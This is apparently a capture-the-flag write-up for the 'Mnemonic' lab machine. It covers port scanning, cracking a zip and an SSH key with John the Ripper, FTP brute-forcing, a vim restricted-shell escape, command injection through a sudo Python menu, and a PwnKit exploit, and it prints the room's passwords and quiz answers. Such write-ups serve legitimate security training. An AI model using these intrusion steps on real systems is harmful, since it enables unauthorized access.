Room: Mnemonic 
Difficulty: Medium

Objective: Enumerate the web services, crack encrypted files, and leverage Python script vulnerabilities for Root access.
## 🛡️ Phase 1: Reconnaissance
I started by scanning for open ports using nmap -sC -sV -p-:

```Plaintext
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
1337/tcp open  ssh     OpenSSH 7.6p1
```
### Question 1: How many open ports? 3

### Question 2: What is the SSH port number? 1337

## 🔍 Phase 2: Directory Enumeration & File Cracking
Scanning for hidden directories under /webmasters led to /admin and /backups. While the pages appeared empty, a recursive ffuf scan revealed a hidden zip file: /webmasters/backups/backups.zip.

### Question 3: What is the name of the secret file? backups.zip

## Cracking the Zip
The zip file was password-protected. I used johntheripper to crack it:
```bash
zip2john backups.zip > ziphash.txt
```
```bash
john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Inside the extracted note.txt, I found:
```plaintext
James new ftp username: ftpuser
```
### Question 4: FTP username? ftpuser
## 🔓 Phase 3: FTP & SSH Access
I brute-forced the FTP login for ftpuser to find the password.

### Question 5: FTP password? love4ever

Inside the FTP server, I found not.txt and an id_rsa key. Identifying this as James's key:

### Question 6: What is the SSH username? James

## Cracking the SSH Key
I used john again to crack the passphrase for the id_rsa key:
```bash
ssh2john id_rsa > james_rsa
```
```bash
john james_rsa --wordlist=/usr/share/wordlists/rockyou.txt
```
### Question 7: What is the SSH password? bluelove

Upon logging into SSH as James, I was placed in a restricted shell (rbash) with a logout timer. To escape this and navigate freely, I used the Vim technique:
```bash
vim -c ':!bash'
```

Once I escaped, I found a note from @vill that explained the next step:

### File: noteforjames.txt
``` plaintext
james i found a new encryption İmage based name is Mnemonic

I created the condor password. don't forget the beers on saturday
```
I also found a list of numbers required for the decryption process:

File: 6450.txt
``` plaintext
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494
```
## Decryption Tool
I found a repository for the Mnemonic tool and transferred 6450.txt to my machine for processing.
https://github.com/MustafaTanguner/Mnemonic/blob/master/README.md
### Technical Note: I encountered an issue with integer length during execution. I fixed this by editing the script to include sys.set_int_max_str_digits(1000). Using the provided image and these numbers, I successfully decrypted the password.
```bash
sys.set_int_max_str_digits(1000)
```
### Question 8: What is the condor password? pasificbell1981

## ⚡ Phase 5: Privilege Escalation
I logged in as the user condor via SSH and checked my sudo permissions:
```bash
(ALL : ALL) /usr/bin/python3 /bin/examplecode.py
```
Running the script presents a menu:
``` bash
Network Connections

Show ifconfig
...

Root Shell Spawn (Useless)

Print date

Exit
```
## The "Exit" Exploit
The "Exit" behaved strangely. When I selected it, the script asked:
```bash
are you sure you want to quit ? yes : .

Running....

```
then I typed /bin/bash. The script executed the path as root, granting me a full root shell.
```bash
are you sure you want to quit ? yes : .

Running..../bin/bash

```
You can get the flag on /root/root.txt but encode the flag value on MD5 to get the final flag

# 💡 Alternative Path: PwnKit
As an easier technique, I found the machine was vulnerable to PwnKit (CVE-2021-4034). I uploaded the exploit to /tmp and executed it:
```bash
james@mnemonic:/tmp$ chmod +x PwnKit
james@mnemonic:/tmp$ ./PwnKit
root@mnemonic:/tmp#
```

